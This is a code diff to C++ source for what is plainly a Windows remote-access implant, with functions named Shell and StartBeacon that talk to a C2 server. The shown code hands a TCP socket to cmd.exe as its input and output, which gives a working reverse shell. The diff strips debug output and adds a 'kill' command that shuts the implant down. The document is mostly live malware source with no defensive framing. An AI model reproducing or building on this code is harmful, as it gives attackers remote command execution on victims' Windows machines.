@@ -61,14 +61,11 @@ void Shell(char* C2Server, int C2Port)
 		
 		char RecvData[1024];
 		
-		std::cout << "[DBG] 0\n";
 		memset(RecvData, 0, sizeof(RecvData));
 		
-		std::cout << "[DBG] 1\n";
 		// here waits for any data input from Server
 		int RecvCode = recv(tcpsock, RecvData, 1024, 0);
 		
-		std::cout << "[DBG] 2\n";
 		if (RecvCode <= 0){
 			std::cout << "[DBG] RECVCODE = 0\n";
 			closesocket(tcpsock);
@@ -76,45 +73,25 @@ void Shell(char* C2Server, int C2Port)
 			return;
 		}
 		else {
-			std::cout << "[DBG] 3\n";
 			char Process[] = "cmd.exe";
 			STARTUPINFOA sinfo;
 			PROCESS_INFORMATION pinfo;
 			memset(&sinfo, 0, sizeof(sinfo));
 			
-			std::cout << "[DBG] 4\n";
 			sinfo.cb = sizeof(sinfo);
 			sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
 			
-			std::cout << "[DBG] 5\n";
 			// Socket is Handle for stdin/stdout/stderr descriptors of process
 			sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcpsock;
 			
-			std::cout << "[DBG] 6\n";
 			CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 			WaitForSingleObject(pinfo.hProcess, INFINITE);
 			
-			std::cout << "[DBG] 7\n";
 			CloseHandle(pinfo.hProcess);
 			CloseHandle(pinfo.hThread);
 			
-			std::cout << "[DBG] 8\n";
 			memset(RecvData, 0, sizeof(RecvData));
 			
-			/*int RecvCode = recv(tcpsock, RecvData, 1024, 0);
-			
-			std::cout << "[DBG] 9\n";
-			if (RecvCode <= 0){
-				std::cout << "[DBG] RECVCODE = 0 2nd time\n";
-				closesocket(tcpsock);
-				WSACleanup();
-				return;
-			}
-			if (strcmp(RecvData, "exit\n") == 0) {
-				closesocket(tcpsock);
-				WSACleanup();
-				return;
-			}*/
 		}
 	}
 }
@@ -208,12 +185,16 @@ void StartBeacon(char* C2Server, int C2Port)
 				Shell(C2Server,C2Port);
 			}
 			else if (strcmp(RecvData, "exit\n") == 0) {
-				std::cout << "Command parsed: exit" << std::endl;
-				std::cout << "Closing connection..." << std::endl;
 				closesocket(tcpsock);
 				WSACleanup();
 				Sleep(1000);
 				return;
+			}
+			else if (strcmp(RecvData, "kill\n") == 0) {
+				closesocket(tcpsock);
+				WSACleanup();
+				Sleep(1000);
+				exit(0);
 			}
 			else {
 				std::cout << "[DBG]  Command received: " << RecvData << std::endl;
